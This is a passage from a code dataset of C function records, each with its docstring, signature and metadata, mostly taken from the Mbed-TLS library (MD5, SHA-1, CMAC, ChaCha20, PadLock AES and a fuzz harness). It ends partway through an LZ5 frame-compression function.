mbedtls_ssl_handshake( &ssl );\n    if( ret == 0 )\n    {\n        //keep reading data from server until the end\n        do\n        {\n            len = sizeof( buf ) - 1;\n            ret = mbedtls_ssl_read( &ssl, buf, len );\n\n            if( ret == MBEDTLS_ERR_SSL_WANT_READ )\n                continue;\n            else if( ret <= 0 )\n                //EOF or error\n                break;\n        }\n        while( 1 );\n    }\n\nexit:\n    mbedtls_entropy_free( &entropy );\n    mbedtls_ctr_drbg_free( &ctr_drbg );\n    mbedtls_ssl_config_free( &conf );\n    mbedtls_ssl_free( &ssl );\n\n#else\n    (void) Data;\n    (void) Size;\n#endif /* MBEDTLS_SSL_CLI_C && MBEDTLS_ENTROPY_C && MBEDTLS_CTR_DRBG_C */\n\n    return 0;\n}", "path": "mbedtls/programs/fuzz/fuzz_client.c", "commit_date": "2020-05-29 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/*\n * PadLock AES-CBC buffer en(de)cryption\n */\n", "func_signal": "int mbedtls_padlock_xcryptcbc( mbedtls_aes_context *ctx,\n                       int mode,\n                       size_t length,\n                       unsigned char iv[16],\n                       const unsigned char *input,\n                       unsigned char *output )", "code": "{\n    int ebx = 0;\n    size_t count;\n    uint32_t *rk;\n    uint32_t *iw;\n    uint32_t *ctrl;\n    unsigned char buf[256];\n\n    if( ( (long) input  & 15 ) != 0 ||\n        ( (long) output & 15 ) != 0 )\n        return( MBEDTLS_ERR_PADLOCK_DATA_MISALIGNED );\n\n    rk = ctx->rk;\n    iw = MBEDTLS_PADLOCK_ALIGN16( buf );\n    memcpy( iw, iv, 16 );\n\n     ctrl = iw + 4;\n    *ctrl = 0x80 | ctx->nr | ( ( ctx->nr + ( mode ^ 1 ) - 10 ) << 9 );\n\n    count = ( length + 15 ) >> 4;\n\n    asm( \"pushfl                        \\n\\t\"\n         \"popfl                         \\n\\t\"\n         \"movl    %%ebx, %0             \\n\\t\"\n         \"movl    %2, %%ecx             \\n\\t\"\n         \"movl    %3, %%edx             \\n\\t\"\n         \"movl    %4, %%ebx             \\n\\t\"\n         \"movl    %5, %%esi             \\n\\t\"\n         \"movl    %6, %%edi             \\n\\t\"\n         \"movl    %7, %%eax             \\n\\t\"\n         \".byte  0xf3,0x0f,0xa7,0xd0    \\n\\t\"\n         \"movl    %1, %%ebx             \\n\\t\"\n         : \"=m\" (ebx)\n         :  \"m\" (ebx), \"m\" (count), \"m\" (ctrl),\n            \"m\"  (rk), \"m\" (input), \"m\" (output), \"m\" (iw)\n         : \"memory\", \"eax\", \"ecx\", \"edx\", \"esi\", \"edi\" );\n\n    memcpy( iv, iw, 16 );\n\n    return( 0 );\n}", "path": "mbedtls/library/padlock.c", "commit_date": "2020-08-19 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/*\n * output = MD5( input buffer )\n */\n", "func_signal": "int mbedtls_md5_ret( const unsigned char *input,\n                     size_t ilen,\n                     unsigned char output[16] )", "code": "{\n    int ret = MBEDTLS_ERR_ERROR_CORRUPTION_DETECTED;\n    mbedtls_md5_context ctx;\n\n    mbedtls_md5_init( &ctx );\n\n    if( ( ret = mbedtls_md5_starts_ret( &ctx ) ) != 0 )\n        goto exit;\n\n    if( ( ret = mbedtls_md5_update_ret( &ctx, input, ilen ) ) != 0 )\n        goto exit;\n\n    if( ( ret = mbedtls_md5_finish_ret( &ctx, output ) ) != 0 )\n        goto exit;\n\nexit:\n    mbedtls_md5_free( &ctx );\n\n    return( ret );\n}", "path": "mbedtls/library/md5.c", "commit_date": "2020-12-03 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/*\n * SHA-1 context setup\n */\n", "func_signal": "int mbedtls_sha1_starts_ret( mbedtls_sha1_context *ctx )", "code": "{\n    SHA1_VALIDATE_RET( ctx != NULL );\n\n    ctx->total[0] = 0;\n    ctx->total[1] = 0;\n\n    ctx->state[0] = 0x67452301;\n    ctx->state[1] = 0xEFCDAB89;\n    ctx->state[2] = 0x98BADCFE;\n    ctx->state[3] = 0x10325476;\n    ctx->state[4] = 0xC3D2E1F0;\n\n    return( 0 );\n}", "path": "mbedtls/library/sha1.c", "commit_date": "2020-09-18 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/*\n * MD5 final digest\n */\n", "func_signal": "int mbedtls_md5_finish_ret( mbedtls_md5_context *ctx,\n                            unsigned char output[16] )", "code": "{\n    int ret = MBEDTLS_ERR_ERROR_CORRUPTION_DETECTED;\n    uint32_t used;\n    uint32_t high, low;\n\n    /*\n     * Add padding: 0x80 then 0x00 until 8 bytes remain for the length\n     */\n    used = ctx->total[0] & 0x3F;\n\n    ctx->buffer[used++] = 0x80;\n\n    if( used <= 56 )\n    {\n        /* Enough room for padding + length in current block */\n        memset( ctx->buffer + used, 0, 56 - used );\n    }\n    else\n    {\n        /* We'll need an extra block */\n        memset( ctx->buffer + used, 0, 64 - used );\n\n        if( ( ret = mbedtls_internal_md5_process( ctx, ctx->buffer ) ) != 0 )\n            return( ret );\n\n        memset( ctx->buffer, 0, 56 );\n    }\n\n    /*\n     * Add message length\n     */\n    high = ( ctx->total[0] >> 29 )\n         | ( ctx->total[1] <<  3 );\n    low  = ( ctx->total[0] <<  3 );\n\n    PUT_UINT32_LE( low,  ctx->buffer, 56 );\n    PUT_UINT32_LE( high, ctx->buffer, 60 );\n\n    if( ( ret = mbedtls_internal_md5_process( ctx, ctx->buffer ) ) != 0 )\n        return( ret );\n\n    /*\n     * Output final state\n     */\n    PUT_UINT32_LE( ctx->state[0], output,  0 );\n    PUT_UINT32_LE( ctx->state[1], output,  4 );\n    PUT_UINT32_LE( ctx->state[2], output,  8 );\n    PUT_UINT32_LE( ctx->state[3], output, 12 );\n\n    return( 0 );\n}", "path": "mbedtls/library/md5.c", "commit_date": "2020-12-03 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/* MBEDTLS_AES_C */\n", "func_signal": "static int cmac_test_subkeys( int verbose,\n                              const char* testname,\n                              const unsigned char* key,\n                              int keybits,\n                              const unsigned char* subkeys,\n                              mbedtls_cipher_type_t cipher_type,\n                              int block_size,\n                              int num_tests )", "code": "{\n    int i, ret = 0;\n    mbedtls_cipher_context_t ctx;\n    const mbedtls_cipher_info_t *cipher_info;\n    unsigned char K1[MBEDTLS_CIPHER_BLKSIZE_MAX];\n    unsigned char K2[MBEDTLS_CIPHER_BLKSIZE_MAX];\n\n    cipher_info = mbedtls_cipher_info_from_type( cipher_type );\n    if( cipher_info == NULL )\n    {\n        /* Failing at this point must be due to a build issue */\n        return( MBEDTLS_ERR_CIPHER_FEATURE_UNAVAILABLE );\n    }\n\n    for( i = 0; i < num_tests; i++ )\n    {\n        if( verbose != 0 )\n            mbedtls_printf( \"  %s CMAC subkey #%d: \", testname, i + 1 );\n\n        mbedtls_cipher_init( &ctx );\n\n        if( ( ret = mbedtls_cipher_setup( &ctx, cipher_info ) ) != 0 )\n        {\n            if( verbose != 0 )\n                mbedtls_printf( \"test execution failed\\n\" );\n\n            goto cleanup;\n        }\n\n        if( ( ret = mbedtls_cipher_setkey( &ctx, key, keybits,\n                                       MBEDTLS_ENCRYPT ) ) != 0 )\n        {\n            if( verbose != 0 )\n                mbedtls_printf( \"test execution failed\\n\" );\n\n            goto cleanup;\n        }\n\n        ret = cmac_generate_subkeys( &ctx, K1, K2 );\n        if( ret != 0 )\n        {\n           if( verbose != 0 )\n                mbedtls_printf( \"failed\\n\" );\n\n            goto cleanup;\n        }\n\n        if( ( ret = memcmp( K1, subkeys, block_size ) ) != 0  ||\n            ( ret = memcmp( K2, &subkeys[block_size], block_size ) ) != 0 )\n        {\n            if( verbose != 0 )\n                mbedtls_printf( \"failed\\n\" );\n\n            goto cleanup;\n        }\n\n        if( verbose != 0 )\n            mbedtls_printf( \"passed\\n\" );\n\n        mbedtls_cipher_free( &ctx );\n    }\n\n    ret = 0;\n    goto exit;\n\ncleanup:\n    mbedtls_cipher_free( &ctx );\n\nexit:\n    return( ret );\n}", "path": "mbedtls/library/cmac.c", "commit_date": "2020-11-25 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/*\n * output = SHA-1( input buffer )\n */\n", "func_signal": "int mbedtls_sha1_ret( const unsigned char *input,\n                      size_t ilen,\n                      unsigned char output[20] )", "code": "{\n    int ret = MBEDTLS_ERR_ERROR_CORRUPTION_DETECTED;\n    mbedtls_sha1_context ctx;\n\n    SHA1_VALIDATE_RET( ilen == 0 || input != NULL );\n    SHA1_VALIDATE_RET( (unsigned char *)output != NULL );\n\n    mbedtls_sha1_init( &ctx );\n\n    if( ( ret = mbedtls_sha1_starts_ret( &ctx ) ) != 0 )\n        goto exit;\n\n    if( ( ret = mbedtls_sha1_update_ret( &ctx, input, ilen ) ) != 0 )\n        goto exit;\n\n    if( ( ret = mbedtls_sha1_finish_ret( &ctx, output ) ) != 0 )\n        goto exit;\n\nexit:\n    mbedtls_sha1_free( &ctx );\n\n    return( ret );\n}", "path": "mbedtls/library/sha1.c", "commit_date": "2020-09-18 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/**\n * \\brief           ChaCha20 quarter round operation.\n *\n *                  The quarter round is defined as follows (from RFC 7539):\n *                      1.  a += b; d ^= a; d <<<= 16;\n *                      2.  c += d; b ^= c; b <<<= 12;\n *                      3.  a += b; d ^= a; d <<<= 8;\n *                      4.  c += d; b ^= c; b <<<= 7;\n *\n * \\param state     ChaCha20 state to modify.\n * \\param a         The index of 'a' in the state.\n * \\param b         The index of 'b' in the state.\n * \\param c         The index of 'c' in the state.\n * \\param d         The index of 'd' in the state.\n */\n", "func_signal": "static inline void chacha20_quarter_round( uint32_t state[16],\n                                           size_t a,\n                                           size_t b,\n                                           size_t c,\n                                           size_t d )", "code": "{\n    /* a += b; d ^= a; d <<<= 16; */\n    state[a] += state[b];\n    state[d] ^= state[a];\n    state[d] = ROTL32( state[d], 16 );\n\n    /* c += d; b ^= c; b <<<= 12 */\n    state[c] += state[d];\n    state[b] ^= state[c];\n    state[b] = ROTL32( state[b], 12 );\n\n    /* a += b; d ^= a; d <<<= 8; */\n    state[a] += state[b];\n    state[d] ^= state[a];\n    state[d] = ROTL32( state[d], 8 );\n\n    /* c += d; b ^= c; b <<<= 7; */\n    state[c] += state[d];\n    state[b] ^= state[c];\n    state[b] = ROTL32( state[b], 7 );\n}", "path": "mbedtls/library/chacha20.c", "commit_date": "2020-08-19 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/*\n * Checkup routine\n */\n", "func_signal": "int mbedtls_sha1_self_test( int verbose )", "code": "{\n    int i, j, buflen, ret = 0;\n    unsigned char buf[1024];\n    unsigned char sha1sum[20];\n    mbedtls_sha1_context ctx;\n\n    mbedtls_sha1_init( &ctx );\n\n    /*\n     * SHA-1\n     */\n    for( i = 0; i < 3; i++ )\n    {\n        if( verbose != 0 )\n            mbedtls_printf( \"  SHA-1 test #%d: \", i + 1 );\n\n        if( ( ret = mbedtls_sha1_starts_ret( &ctx ) ) != 0 )\n            goto fail;\n\n        if( i == 2 )\n        {\n            memset( buf, 'a', buflen = 1000 );\n\n            for( j = 0; j < 1000; j++ )\n            {\n                ret = mbedtls_sha1_update_ret( &ctx, buf, buflen );\n                if( ret != 0 )\n                    goto fail;\n            }\n        }\n        else\n        {\n            ret = mbedtls_sha1_update_ret( &ctx, sha1_test_buf[i],\n                                           sha1_test_buflen[i] );\n            if( ret != 0 )\n                goto fail;\n        }\n\n        if( ( ret = mbedtls_sha1_finish_ret( &ctx, sha1sum ) ) != 0 )\n            goto fail;\n\n        if( memcmp( sha1sum, sha1_test_sum[i], 20 ) != 0 )\n        {\n            ret = 1;\n            goto fail;\n        }\n\n        if( verbose != 0 )\n            mbedtls_printf( \"passed\\n\" );\n    }\n\n    if( verbose != 0 )\n        mbedtls_printf( \"\\n\" );\n\n    goto exit;\n\nfail:\n    if( verbose != 0 )\n        mbedtls_printf( \"failed\\n\" );\n\nexit:\n    mbedtls_sha1_free( &ctx );\n\n    return( ret );\n}", "path": "mbedtls/library/sha1.c", "commit_date": "2020-09-18 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/* MBEDTLS_AES_C */\n", "func_signal": "int mbedtls_cmac_self_test( int verbose )", "code": "{\n    int ret = MBEDTLS_ERR_ERROR_CORRUPTION_DETECTED;\n\n#if defined(MBEDTLS_AES_C)\n    /* AES-128 */\n    if( ( ret = cmac_test_subkeys( verbose,\n                                   \"AES 128\",\n                                   aes_128_key,\n                                   128,\n                                   (const unsigned char*)aes_128_subkeys,\n                                   MBEDTLS_CIPHER_AES_128_ECB,\n                                   MBEDTLS_AES_BLOCK_SIZE,\n                                   NB_CMAC_TESTS_PER_KEY ) ) != 0 )\n    {\n        return( ret );\n    }\n\n    if( ( ret = cmac_test_wth_cipher( verbose,\n                                      \"AES 128\",\n                                      aes_128_key,\n                                      128,\n                                      test_message,\n                                      aes_message_lengths,\n                                      (const unsigned char*)aes_128_expected_result,\n                                      MBEDTLS_CIPHER_AES_128_ECB,\n                                      MBEDTLS_AES_BLOCK_SIZE,\n                                      NB_CMAC_TESTS_PER_KEY ) ) != 0 )\n    {\n        return( ret );\n    }\n\n    /* AES-192 */\n    if( ( ret = cmac_test_subkeys( verbose,\n                                   \"AES 192\",\n                                   aes_192_key,\n                                   192,\n                                   (const unsigned char*)aes_192_subkeys,\n                                   MBEDTLS_CIPHER_AES_192_ECB,\n                                   MBEDTLS_AES_BLOCK_SIZE,\n                                   NB_CMAC_TESTS_PER_KEY ) ) != 0 )\n    {\n        return( ret );\n    }\n\n    if( ( ret = cmac_test_wth_cipher( verbose,\n                                      \"AES 192\",\n                                      aes_192_key,\n                                      192,\n                                      test_message,\n                                      aes_message_lengths,\n                                      (const unsigned char*)aes_192_expected_result,\n                                      MBEDTLS_CIPHER_AES_192_ECB,\n                                      MBEDTLS_AES_BLOCK_SIZE,\n                                      NB_CMAC_TESTS_PER_KEY ) ) != 0 )\n    {\n        return( ret );\n    }\n\n    /* AES-256 */\n    if( ( ret = cmac_test_subkeys( verbose,\n                                   \"AES 256\",\n                                   aes_256_key,\n                                   256,\n                                   (const unsigned char*)aes_256_subkeys,\n                                   MBEDTLS_CIPHER_AES_256_ECB,\n                                   MBEDTLS_AES_BLOCK_SIZE,\n                                   NB_CMAC_TESTS_PER_KEY ) ) != 0 )\n    {\n        return( ret );\n    }\n\n    if( ( ret = cmac_test_wth_cipher ( verbose,\n                                       \"AES 256\",\n                                       aes_256_key,\n                                       256,\n                                       test_message,\n                                       aes_message_lengths,\n                                       (const unsigned char*)aes_256_expected_result,\n                                       MBEDTLS_CIPHER_AES_256_ECB,\n                                       MBEDTLS_AES_BLOCK_SIZE,\n                                       NB_CMAC_TESTS_PER_KEY ) ) != 0 )\n    {\n        return( ret );\n    }\n#endif /* MBEDTLS_AES_C */\n\n#if defined(MBEDTLS_DES_C)\n    /* 3DES 2 key */\n    if( ( ret = cmac_test_subkeys( verbose,\n                                   \"3DES 2 key\",\n                                   des3_2key_key,\n                                   192,\n                                   (const unsigned char*)des3_2key_subkeys,\n                                   MBEDTLS_CIPHER_DES_EDE3_ECB,\n                                   MBEDTLS_DES3_BLOCK_SIZE,\n                                   NB_CMAC_TESTS_PER_KEY ) ) != 0 )\n    {\n        return( ret );\n    }\n\n    if( ( ret = cmac_test_wth_cipher( verbose,\n                                      \"3DES 2 key\",\n                                      des3_2key_key,\n                                      192,\n                                      test_message,\n                                      des3_message_lengths,\n                                      (const unsigned char*)des3_2key_expected_result,\n                                      MBEDTLS_CIPHER_DES_EDE3_ECB,\n                                      MBEDTLS_DES3_BLOCK_SIZE,\n                                      NB_CMAC_TESTS_PER_KEY ) ) != 0 )\n    {\n        return( ret );\n    }\n\n    /* 3DES 3 key */\n    if( ( ret = cmac_test_subkeys( verbose,\n                                   \"3DES 3 key\",\n                                   des3_3key_key,\n                                   192,\n                                   (const unsigned char*)des3_3key_subkeys,\n                                   MBEDTLS_CIPHER_DES_EDE3_ECB,\n                                   MBEDTLS_DES3_BLOCK_SIZE,\n                                   NB_CMAC_TESTS_PER_KEY ) ) != 0 )\n    {\n        return( ret );\n    }\n\n    if( ( ret = cmac_test_wth_cipher( verbose,\n                                      \"3DES 3 key\",\n                                      des3_3key_key,\n                                      192,\n                                      test_message,\n                                      des3_message_lengths,\n                                      (const unsigned char*)des3_3key_expected_result,\n                                      MBEDTLS_CIPHER_DES_EDE3_ECB,\n                                      MBEDTLS_DES3_BLOCK_SIZE,\n                                      NB_CMAC_TESTS_PER_KEY ) ) != 0 )\n    {\n        return( ret );\n    }\n#endif /* MBEDTLS_DES_C */\n\n#if defined(MBEDTLS_AES_C)\n    if( ( ret = test_aes128_cmac_prf( verbose ) ) != 0 )\n        return( ret );\n#endif /* MBEDTLS_AES_C */\n\n    if( verbose != 0 )\n        mbedtls_printf( \"\\n\" );\n\n    return( 0 );\n}", "path": "mbedtls/library/cmac.c", "commit_date": "2020-11-25 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/*\n * PadLock AES-ECB block en(de)cryption\n */\n", "func_signal": "int mbedtls_padlock_xcryptecb( mbedtls_aes_context *ctx,\n                       int mode,\n                       const unsigned char input[16],\n                       unsigned char output[16] )", "code": "{\n    int ebx = 0;\n    uint32_t *rk;\n    uint32_t *blk;\n    uint32_t *ctrl;\n    unsigned char buf[256];\n\n    rk  = ctx->rk;\n    blk = MBEDTLS_PADLOCK_ALIGN16( buf );\n    memcpy( blk, input, 16 );\n\n     ctrl = blk + 4;\n    *ctrl = 0x80 | ctx->nr | ( ( ctx->nr + ( mode^1 ) - 10 ) << 9 );\n\n    asm( \"pushfl                        \\n\\t\"\n         \"popfl                         \\n\\t\"\n         \"movl    %%ebx, %0             \\n\\t\"\n         \"movl    $1, %%ecx             \\n\\t\"\n         \"movl    %2, %%edx             \\n\\t\"\n         \"movl    %3, %%ebx             \\n\\t\"\n         \"movl    %4, %%esi             \\n\\t\"\n         \"movl    %4, %%edi             \\n\\t\"\n         \".byte  0xf3,0x0f,0xa7,0xc8    \\n\\t\"\n         \"movl    %1, %%ebx             \\n\\t\"\n         : \"=m\" (ebx)\n         :  \"m\" (ebx), \"m\" (ctrl), \"m\" (rk), \"m\" (blk)\n         : \"memory\", \"ecx\", \"edx\", \"esi\", \"edi\" );\n\n    memcpy( output, blk, 16 );\n\n    return( 0 );\n}", "path": "mbedtls/library/padlock.c", "commit_date": "2020-08-19 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/**\n * \\brief               Generates a keystream block.\n *\n * \\param initial_state The initial ChaCha20 state (key, nonce, counter).\n * \\param keystream     Generated keystream bytes are written to this buffer.\n */\n", "func_signal": "static void chacha20_block( const uint32_t initial_state[16],\n                            unsigned char keystream[64] )", "code": "{\n    uint32_t working_state[16];\n    size_t i;\n\n    memcpy( working_state,\n            initial_state,\n            CHACHA20_BLOCK_SIZE_BYTES );\n\n    for( i = 0U; i < 10U; i++ )\n        chacha20_inner_block( working_state );\n\n    working_state[ 0] += initial_state[ 0];\n    working_state[ 1] += initial_state[ 1];\n    working_state[ 2] += initial_state[ 2];\n    working_state[ 3] += initial_state[ 3];\n    working_state[ 4] += initial_state[ 4];\n    working_state[ 5] += initial_state[ 5];\n    working_state[ 6] += initial_state[ 6];\n    working_state[ 7] += initial_state[ 7];\n    working_state[ 8] += initial_state[ 8];\n    working_state[ 9] += initial_state[ 9];\n    working_state[10] += initial_state[10];\n    working_state[11] += initial_state[11];\n    working_state[12] += initial_state[12];\n    working_state[13] += initial_state[13];\n    working_state[14] += initial_state[14];\n    working_state[15] += initial_state[15];\n\n    for( i = 0U; i < 16; i++ )\n    {\n        size_t offset = i * 4U;\n\n        keystream[offset     ] = (unsigned char)( working_state[i]       );\n        keystream[offset + 1U] = (unsigned char)( working_state[i] >>  8 );\n        keystream[offset + 2U] = (unsigned char)( working_state[i] >> 16 );\n        keystream[offset + 3U] = (unsigned char)( working_state[i] >> 24 );\n    }\n\n    mbedtls_platform_zeroize( working_state, sizeof( working_state ) );\n}", "path": "mbedtls/library/chacha20.c", "commit_date": "2020-08-19 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/*\n * MD5 process buffer\n */\n", "func_signal": "int mbedtls_md5_update_ret( mbedtls_md5_context *ctx,\n                            const unsigned char *input,\n                            size_t ilen )", "code": "{\n    int ret = MBEDTLS_ERR_ERROR_CORRUPTION_DETECTED;\n    size_t fill;\n    uint32_t left;\n\n    if( ilen == 0 )\n        return( 0 );\n\n    left = ctx->total[0] & 0x3F;\n    fill = 64 - left;\n\n    ctx->total[0] += (uint32_t) ilen;\n    ctx->total[0] &= 0xFFFFFFFF;\n\n    if( ctx->total[0] < (uint32_t) ilen )\n        ctx->total[1]++;\n\n    if( left && ilen >= fill )\n    {\n        memcpy( (void *) (ctx->buffer + left), input, fill );\n        if( ( ret = mbedtls_internal_md5_process( ctx, ctx->buffer ) ) != 0 )\n            return( ret );\n\n        input += fill;\n        ilen  -= fill;\n        left = 0;\n    }\n\n    while( ilen >= 64 )\n    {\n        if( ( ret = mbedtls_internal_md5_process( ctx, input ) ) != 0 )\n            return( ret );\n\n        input += 64;\n        ilen  -= 64;\n    }\n\n    if( ilen > 0 )\n    {\n        memcpy( (void *) (ctx->buffer + left), input, ilen );\n    }\n\n    return( 0 );\n}", "path": "mbedtls/library/md5.c", "commit_date": "2020-12-03 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/*\n * Create padded last block from (partial) last block.\n *\n * We can't use the padding option from the cipher layer, as it only works for\n * CBC and we use ECB mode, and anyway we need to XOR K1 or K2 in addition.\n */\n", "func_signal": "static void cmac_pad( unsigned char padded_block[MBEDTLS_CIPHER_BLKSIZE_MAX],\n                      size_t padded_block_len,\n                      const unsigned char *last_block,\n                      size_t last_block_len )", "code": "{\n    size_t j;\n\n    for( j = 0; j < padded_block_len; j++ )\n    {\n        if( j < last_block_len )\n            padded_block[j] = last_block[j];\n        else if( j == last_block_len )\n            padded_block[j] = 0x80;\n        else\n            padded_block[j] = 0x00;\n    }\n}", "path": "mbedtls/library/cmac.c", "commit_date": "2020-11-25 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/*\n * SHA-1 final digest\n */\n", "func_signal": "int mbedtls_sha1_finish_ret( mbedtls_sha1_context *ctx,\n                             unsigned char output[20] )", "code": "{\n    int ret = MBEDTLS_ERR_ERROR_CORRUPTION_DETECTED;\n    uint32_t used;\n    uint32_t high, low;\n\n    SHA1_VALIDATE_RET( ctx != NULL );\n    SHA1_VALIDATE_RET( (unsigned char *)output != NULL );\n\n    /*\n     * Add padding: 0x80 then 0x00 until 8 bytes remain for the length\n     */\n    used = ctx->total[0] & 0x3F;\n\n    ctx->buffer[used++] = 0x80;\n\n    if( used <= 56 )\n    {\n        /* Enough room for padding + length in current block */\n        memset( ctx->buffer + used, 0, 56 - used );\n    }\n    else\n    {\n        /* We'll need an extra block */\n        memset( ctx->buffer + used, 0, 64 - used );\n\n        if( ( ret = mbedtls_internal_sha1_process( ctx, ctx->buffer ) ) != 0 )\n            return( ret );\n\n        memset( ctx->buffer, 0, 56 );\n    }\n\n    /*\n     * Add message length\n     */\n    high = ( ctx->total[0] >> 29 )\n         | ( ctx->total[1] <<  3 );\n    low  = ( ctx->total[0] <<  3 );\n\n    PUT_UINT32_BE( high, ctx->buffer, 56 );\n    PUT_UINT32_BE( low,  ctx->buffer, 60 );\n\n    if( ( ret = mbedtls_internal_sha1_process( ctx, ctx->buffer ) ) != 0 )\n        return( ret );\n\n    /*\n     * Output final state\n     */\n    PUT_UINT32_BE( ctx->state[0], output,  0 );\n    PUT_UINT32_BE( ctx->state[1], output,  4 );\n    PUT_UINT32_BE( ctx->state[2], output,  8 );\n    PUT_UINT32_BE( ctx->state[3], output, 12 );\n    PUT_UINT32_BE( ctx->state[4], output, 16 );\n\n    return( 0 );\n}", "path": "mbedtls/library/sha1.c", "commit_date": "2020-09-18 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/*\n * Generate subkeys\n *\n * - as specified by RFC 4493, section 2.3 Subkey Generation Algorithm\n */\n", "func_signal": "static int cmac_generate_subkeys( mbedtls_cipher_context_t *ctx,\n                                  unsigned char* K1, unsigned char* K2 )", "code": "{\n    int ret = MBEDTLS_ERR_ERROR_CORRUPTION_DETECTED;\n    unsigned char L[MBEDTLS_CIPHER_BLKSIZE_MAX];\n    size_t olen, block_size;\n\n    mbedtls_platform_zeroize( L, sizeof( L ) );\n\n    block_size = ctx->cipher_info->block_size;\n\n    /* Calculate Ek(0) */\n    if( ( ret = mbedtls_cipher_update( ctx, L, block_size, L, &olen ) ) != 0 )\n        goto exit;\n\n    /*\n     * Generate K1 and K2\n     */\n    if( ( ret = cmac_multiply_by_u( K1, L , block_size ) ) != 0 )\n        goto exit;\n\n    if( ( ret = cmac_multiply_by_u( K2, K1 , block_size ) ) != 0 )\n        goto exit;\n\nexit:\n    mbedtls_platform_zeroize( L, sizeof( L ) );\n\n    return( ret );\n}", "path": "mbedtls/library/cmac.c", "commit_date": "2020-11-25 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/*\n * Implementation of AES-CMAC-PRF-128 defined in RFC 4615\n */\n", "func_signal": "int mbedtls_aes_cmac_prf_128( const unsigned char *key, size_t key_length,\n                              const unsigned char *input, size_t in_len,\n                              unsigned char output[16] )", "code": "{\n    int ret = MBEDTLS_ERR_ERROR_CORRUPTION_DETECTED;\n    const mbedtls_cipher_info_t *cipher_info;\n    unsigned char zero_key[MBEDTLS_AES_BLOCK_SIZE];\n    unsigned char int_key[MBEDTLS_AES_BLOCK_SIZE];\n\n    if( key == NULL || input == NULL || output == NULL )\n        return( MBEDTLS_ERR_CIPHER_BAD_INPUT_DATA );\n\n    cipher_info = mbedtls_cipher_info_from_type( MBEDTLS_CIPHER_AES_128_ECB );\n    if( cipher_info == NULL )\n    {\n        /* Failing at this point must be due to a build issue */\n        ret = MBEDTLS_ERR_CIPHER_FEATURE_UNAVAILABLE;\n        goto exit;\n    }\n\n    if( key_length == MBEDTLS_AES_BLOCK_SIZE )\n    {\n        /* Use key as is */\n        memcpy( int_key, key, MBEDTLS_AES_BLOCK_SIZE );\n    }\n    else\n    {\n        memset( zero_key, 0, MBEDTLS_AES_BLOCK_SIZE );\n\n        ret = mbedtls_cipher_cmac( cipher_info, zero_key, 128, key,\n                                   key_length, int_key );\n        if( ret != 0 )\n            goto exit;\n    }\n\n    ret = mbedtls_cipher_cmac( cipher_info, int_key, 128, input, in_len,\n                               output );\n\nexit:\n    mbedtls_platform_zeroize( int_key, sizeof( int_key ) );\n\n    return( ret );\n}", "path": "mbedtls/library/cmac.c", "commit_date": "2020-11-25 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/*\n * MD5 context setup\n */\n", "func_signal": "int mbedtls_md5_starts_ret( mbedtls_md5_context *ctx )", "code": "{\n    ctx->total[0] = 0;\n    ctx->total[1] = 0;\n\n    ctx->state[0] = 0x67452301;\n    ctx->state[1] = 0xEFCDAB89;\n    ctx->state[2] = 0x98BADCFE;\n    ctx->state[3] = 0x10325476;\n\n    return( 0 );\n}", "path": "mbedtls/library/md5.c", "commit_date": "2020-12-03 00:00:00", "repo_name": "Mbed-TLS/mbedtls", "stars": 4802, "license": "other", "language": "c", "size": 118468}
{"docstring": "/* LZ5F_flush()\n* Should you need to create compressed data immediately, without waiting for a block to be filled,\n* you can call LZ5_flush(), which will immediately compress any remaining data stored within compressionContext.\n* The result of the function is the number of bytes written into dstBuffer\n* (it can be zero, this means there was no data left within compressionContext)\n* The function outputs an error code if it fails (can be tested using LZ5F_isError())\n* The LZ5F_compressOptions_t structure is optional : you can provide NULL as argument.\n*/\n", "func_signal": "size_t LZ5F_flush(LZ5F_compressionContext_t compressionContext, void* dstBuffer, size_t dstMaxSize, const LZ5F_compressOptions_t* compressOptionsPtr)", "code": "{\n    LZ5F_cctx_t* cctxPtr = (LZ5F_cctx_t*)compressionContext;\n    BYTE* const dstStart = (BYTE*)dstBuffer;\n    BYTE* dstPtr = dstStart;\n    compressFunc_t compress;\n\n\n    if (cctxPtr->tmpInSize == 0) return 0;   /* nothing to flush */\n    if (cctxPtr->cStage != 1) return (size_t)-LZ5F_ERROR_GENERIC;\n    if (dstMaxSize < (cctxPtr->tmpInSize + 8)) return (size_t)-LZ5F_ERROR_dstMaxSize_tooSmall;   /* +8 : block header(4) + block checksum(4) */\n    (void)compressOptionsPtr;   /* not yet useful */\n\n    /* select compression function */\n    compress = LZ5F_selectCompression(cctxPtr->prefs.frameInfo.blockMode, cctxPtr->prefs.compressionLevel);\n\n    /* compress tmp buffer */\n    dstPtr += 